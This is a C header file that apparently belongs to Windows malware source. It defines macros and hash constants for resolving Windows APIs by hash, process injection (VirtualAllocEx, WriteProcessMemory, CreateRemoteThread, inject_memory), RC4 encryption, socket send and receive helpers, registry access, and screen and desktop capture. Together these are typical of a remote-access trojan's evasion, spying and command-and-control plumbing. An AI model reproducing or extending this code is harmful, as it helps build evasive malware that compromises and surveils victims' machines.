#define xLoadLibraryA                    global_data->xLoadLibraryA
#define xGetProcAddress                  global_data->xGetProcAddress
#define xGetCurrentProcess               global_data->xGetCurrentProcess
#define xCloseHandle                     global_data->xCloseHandle
#define xOpenProcess                     global_data->xOpenProcess
#define xlstrlenA                        global_data->xlstrlenA
#define xlstrlenW                        global_data->xlstrlenW
#define xlstrcpyA                        global_data->xlstrcpyA
#define xlstrcpyW                        global_data->xlstrcpyW
#define xlstrcmpiW                       global_data->xlstrcmpiW
#define xlstrcatW						 global_data->xlstrcatW
#define xHeapAlloc                       global_data->xHeapAlloc
#define xHeapReAlloc                     global_data->xHeapReAlloc
#define xHeapFree                        global_data->xHeapFree
#define xGetProcessHeap                  global_data->xGetProcessHeap
#define xGetModuleHandleA                global_data->xGetModuleHandleA
#define xGetModuleFileNameW              global_data->xGetModuleFileNameW
#define xCreateMutexA                    global_data->xCreateMutexA
#define xGetLastError                    global_data->xGetLastError
#define xSleep                           global_data->xSleep
#define xVirtualAllocEx                  global_data->xVirtualAllocEx
#define xVirtualFreeEx                   global_data->xVirtualFreeEx
#define xWriteProcessMemory              global_data->xWriteProcessMemory
#define xWaitForSingleObject             global_data->xWaitForSingleObject
#define xCreateToolhelp32Snapshot        global_data->xCreateToolhelp32Snapshot
#define xProcess32FirstW                 global_data->xProcess32FirstW
#define xProcess32NextW                  global_data->xProcess32NextW
#define xExpandEnvironmentStringsW       global_data->xExpandEnvironmentStringsW
#define xCreateProcessW                  global_data->xCreateProcessW
#define xCreateRemoteThread              global_data->xCreateRemoteThread
#define xRtlZeroMemory                   global_data->xRtlZeroMemory
#define xRtlMoveMemory                   global_data->xRtlMoveMemory
#define xRtlCompressBuffer               global_data->xRtlCompressBuffer
#define xRtlGetCompressionWorkSpaceSize  global_data->xRtlGetCompressionWorkSpaceSize
#define xRtlDecompressBuffer             global_data->xRtlDecompressBuffer
#define xOpenProcessToken                global_data->xOpenProcessToken
#define xLookupPrivilegeValueA           global_data->xLookupPrivilegeValueA
#define xAdjustTokenPrivileges           global_data->xAdjustTokenPrivileges
#define xRegOpenKeyExA                   global_data->xRegOpenKeyExA
#define xRegCreateKeyExW                 global_data->xRegCreateKeyExW
#define xRegSetValueExW                  global_data->xRegSetValueExW
#define xRegQueryValueExW                global_data->xRegQueryValueExW
#define xRegCloseKey                     global_data->xRegCloseKey
#define xWSAStartup                      global_data->xWSAStartup
#define xWSACleanup                      global_data->xWSACleanup
#define xhtons                           global_data->xhtons
#define xinet_addr                       global_data->xinet_addr
#define xgethostbyname                   global_data->xgethostbyname
#define xsocket                          global_data->xsocket
#define xclosesocket                     global_data->xclosesocket
#define xconnect                         global_data->xconnect
#define xsetsockopt                      global_data->xsetsockopt
#define xsend                            global_data->xsend
#define xrecv                            global_data->xrecv
#define xselect                          global_data->xselect
#define xGetSystemDirectoryW			 global_data->xGetSystemDirectoryW
#define xGetWindowsDirectoryW			 global_data->xGetWindowsDirectoryW
#define xCopyFileW						 global_data->xCopyFileW

#define get_proc_from_hash               global_data->get_proc_from_hash
#define rc4_init                         global_data->rc4_init
#define rc4_crypt                        global_data->rc4_crypt

#define dlsym(a, b)						 x##b = (_##b)get_proc_from_hash(a, b##_Hash, xGetProcAddress)
#define zero_memory(a, b)				 xRtlZeroMemory(a, b)
#define copy_memory(a, b, c)			 xRtlMoveMemory(a, b, c)
#define alloc_memory(a)                  global_data->alloc_memory(global_data, a)
#define realloc_memory(a, b)             global_data->realloc_memory(global_data, a, b)
#define free_memory(a)                   global_data->free_memory(global_data, a)
#define alloc_executable_memory(a, b)    global_data->alloc_executable_memory(global_data, a, b)
#define free_executable_memory(a, b)     global_data->free_executable_memory(global_data, a, b)
#define inject_memory(a, b, c)           global_data->inject_memory(global_data, a, b, c)
#define compress(a, b, c, d)             global_data->compress(global_data, a, b, c, d)
#define decompress(a, b, c, d)           global_data->decompress(global_data, a, b, c, d)
#define wait_buffer(a, b, c)             global_data->wait_buffer(global_data, a, b, c)
#define recv_data(a, b, c)               global_data->recv_data(global_data, a, b, c)
#define send_data(a, b, c)               global_data->send_data(global_data, a, b, c)

#define WideCharToMultiByte_Hash				0x1586B38D
#define MessageBoxA_Hash						0x6DBE321
#define GetTickCount_Hash						0x739B463C
#define gethostname_Hash						0x294C801D
#define inet_ntoa_Hash							0x6AAA5A67
#define GetSystemDirectoryA_Hash				0x4599D4E5
#define GetFileVersionInfoSizeA_Hash			0x21F935B0
#define GetFileVersionInfoA_Hash				0x10896CE1
#define VerQueryValueA_Hash						0x2C86E35
#define wnsprintfA_Hash							0x31EFB1A4
#define GetComputerNameW_Hash					0x7B8E4DB
#define GetUserNameW_Hash						0x3FDDCE23
#define GlobalMemoryStatusEx_Hash				0x573FA7C5
#define GetLocaleInfoA_Hash						0x6352029F
#define GetLocaleInfoW_Hash						0x635202B5
#define lstrcatA_Hash							0x61940C44
#define RegQueryValueExA_Hash					0x520D276D
#define CreatePipe_Hash							0x1D5E2712
#define GetExitCodeProcess_Hash					0x5B194A22
#define PeekNamedPipe_Hash						0x675D205C
#define ReadFile_Hash							0x3B07BD16
#define WriteFile_Hash							0x3BC8276B
#define TerminateProcess_Hash					0x90BAA3A
#define CreateCompatibleBitmap_Hash             0x3239F2EB
#define GetDIBits_Hash                          0x495E766D
#define CreateDIBSection_Hash                   0x1491701C
#define CreateCompatibleDC_Hash                 0x3288E377
#define SelectObject_Hash                       0x40EDCEC3
#define DeleteDC_Hash                           0x19DD01DA
#define DeleteObject_Hash                       0x4A77AB92
#define SetRect_Hash                            0x506869BE
#define GetCurrentThreadId_Hash                 0x39F69680
#define GetUserObjectInformationA_Hash          0x3CB39ABD
#define lstrcmpiA_Hash                          0x705CF2A5
#define SetThreadDesktop_Hash                   0xB44EEB4
#define CloseDesktop_Hash                       0x53E66194
#define GetSystemMetrics_Hash                   0x1028C0F2
#define GetDesktopWindow_Hash                   0x4AA73B6
#define GetDC_Hash                              0x6BF4B1C1
#define ReleaseDC_Hash                          0x4F6E1CC2
#define SetRectEmpty_Hash                       0x4FC4E8F3
#define BitBlt_Hash                             0x1AD7E525
#define GetCursorPos_Hash                       0x598CB350
#define StretchBlt_Hash                         0x4FF19A01
#define GetThreadDesktop_Hash                   0x717807B0
#define OpenInputDesktop_Hash                   0x4DF183D4